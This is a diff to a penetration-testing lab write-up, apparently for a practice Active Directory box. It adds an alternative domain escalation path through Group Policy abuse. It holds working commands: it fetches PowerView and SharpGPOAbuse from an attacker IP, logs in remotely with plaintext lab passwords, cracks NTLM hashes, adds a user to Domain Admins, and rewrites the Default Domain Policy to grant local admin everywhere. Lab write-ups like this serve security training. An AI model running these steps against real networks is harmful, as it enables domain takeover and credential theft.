@@ -787,6 +787,8 @@ type C:\Users\Administrator.DC01\Desktop\proof.txt
 8253189807ece83a9dee44f44e6e8a69
 ```
 
+# Post Exploitation
+
 Promote charlotte to a domain admin:
 ```powershell
 Add-ADGroupMember -Identity "Domain Admins" -Members "charlotte"
@@ -831,14 +833,252 @@ SECURE$:1105:aad3b435b51404eeaad3b435b51404ee:7ab8b0770c6aefa689e8e4ed1fc20bd6::
 ERA$:1106:aad3b435b51404eeaad3b435b51404ee:29f461a9f5b0f30aeb4641d5ccb9c3e9:::
 ```
 
-Crack michaels password:
+Crack michaels (= domain admin) password:
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 
 # 86593b65670ad9905e397ed56e6a86f3:angelomichael
 ```
 
-
 ---
-# Official walkthrough
+# Alternative - GPO
 
+Download PowerView, SharpGPOAbuse.exe:
+```powershell
+iwr -uri http://192.168.45.167/PowerView.ps1 -Outfile PowerView.ps1
+iwr -uri http://192.168.45.167/SharpGPOAbuse.exe -Outfile SharpGPOAbuse.exe
+```
+
+## Attempt 1 - Enumerate GPO from VM01 as Eric
+
+RDP login to VM01 as Eric:
+```bash
+xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:192.168.205.95 /cert:ignore +clipboard /dynamic-resolution
+```
+
+## Attempt 2 - Enumerate GPO from VM02 as Administrator
+
+```bash
+evil-winrm -i 192.168.205.96 -u administrator -p 'Almost4There8.?'
+```
+
+## Attempt 3 - Enumerate GPO from DC01 as charlotte
+
+Access DC01 as charlotte:
+```bash
+evil-winrm -i 192.168.205.97 -u charlotte -p 'Game2On4.!'
+```
+
+List policies:
+```powershell
+Get-DomainGPO
+
+# usncreated               : 5900
+# systemflags              : -1946157056
+# displayname              : Default Domain Policy
+# ...
+
+
+```
+
+Check permissions:
+```powershell
+Get-GPPermission -Name "Default Domain Policy" -All
+
+
+Trustee     : Authenticated Users
+TrusteeType : WellKnownGroup
+Permission  : GpoApply
+Inherited   : False
+
+Trustee     : Domain Admins
+TrusteeType : Group
+Permission  : GpoCustom
+Inherited   : False
+
+Trustee     : Enterprise Admins
+TrusteeType : Group
+Permission  : GpoCustom
+Inherited   : False
+
+Trustee     : charlotte
+TrusteeType : User
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+
+Trustee     : ENTERPRISE DOMAIN CONTROLLERS
+TrusteeType : WellKnownGroup
+Permission  : GpoRead
+Inherited   : False
+
+Trustee     : SYSTEM
+TrusteeType : WellKnownGroup
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+```
+=> charlotte has `GpoEditDeleteModifySecurity` privs
+
+Abuse privs to add charlotte as local administrator to GPO => effectively making charlotte a local admin on every workstation that updates to the new GPO:
+```powershell
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
+[+] Domain = secura.yzx
+[+] Domain Controller = dc01.secura.yzx
+[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
+[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+```
+
+### Before GPO update
+
+On VM01:
+```
+net localgroup "Administrators"
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+SECURA\Domain Admins
+SECURA\Eric.Wallows
+The command completed successfully.
+```
+
+On VM02:
+```
+net localgroup "Administrators"
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+SECURA\Domain Admins
+The command completed successfully.
+```
+
+Downloaded GPT.INI and GptTmpl.inf from the SMB policy folder:
+```
+cat GPT.INI 
+[General]
+Version=196678
+
+cat GptTmpl.inf                                                                                                                                                                                                                     1 ↵
+��[Unicode]
+Unicode=yes
+[System Access]
+PasswordComplexity = 0
+LockoutBadCount = 0
+RequireLogonToChangePassword = 0
+ForceLogoffWhenHourExpire = 0
+ClearTextPassword = 0
+LSAAnonymousNameLookup = 0
+[Kerberos Policy]
+MaxTicketAge = 10
+MaxRenewAge = 7
+MaxServiceAge = 600
+MaxClockSkew = 5
+TicketValidateClient = 1
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Registry Values]
+MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
+```
+
+### After GPO update
+
+Run `gpupdate /force` on both workstations.
+
+On VM01:
+```
+net localgroup "Administrators"
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+SECURA\charlotte
+The command completed successfully.
+```
+=> charlotte is now local admin (somehow eric is no longer lol)
+
+On VM02:
+```
+net localgroup "Administrators"
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+SECURA\charlotte
+The command completed successfully.
+```
+=> charlotte is now local admin
+
+
+Downloaded GPT.INI and GptTmpl.inf from the SMB policy folder:
+```
+cat GPT.INI 
+[General]
+Version=196679
+
+cat GptTmpl.inf 
+[Unicode]
+Unicode=yes
+[System Access]
+PasswordComplexity = 0
+LockoutBadCount = 0
+RequireLogonToChangePassword = 0
+ForceLogoffWhenHourExpire = 0
+ClearTextPassword = 0
+LSAAnonymousNameLookup = 0
+[Kerberos Policy]
+MaxTicketAge = 10
+MaxRenewAge = 7
+MaxServiceAge = 600
+MaxClockSkew = 5
+TicketValidateClient = 1
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Registry Values]
+MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
+[Group Membership]
+*S-1-5-32-544__Memberof =
+*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104
+```
+
+The version number increased and the group membership section was added:
+```
+[Group Membership]
+*S-1-5-32-544__Memberof =
+*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104
+```
+
+**`S-1-5-32-544`**: This is the well-known SID for the **BUILTIN\Administrators** (Local Administrators) group.
+**S-1-5-21-3453094141-4163309614-2941200192-1104**: This is the SID of charlotte (see below)
+
+evil-winrm session as charlotte on DC01:
+```
+whoami /user
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ ==============================================
+secura\charlotte S-1-5-21-3453094141-4163309614-2941200192-1104
+```
